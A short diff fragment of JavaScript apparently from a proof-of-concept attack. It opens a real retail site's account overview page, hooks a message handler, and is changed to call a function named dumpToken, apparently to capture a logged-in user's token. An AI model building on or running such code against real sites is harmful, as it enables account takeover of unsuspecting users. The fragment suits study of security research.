@@ -24,4 +24,4 @@ function hookMessageHandler(){
 }
 mainsite.location = "https://www.zooplus.fr/account/overview"
 setTimeout(hookMessageHandler, 3000);
-setTimeout(hookMessageHandler, 5000);
+setTimeout(dumpToken, 5000);
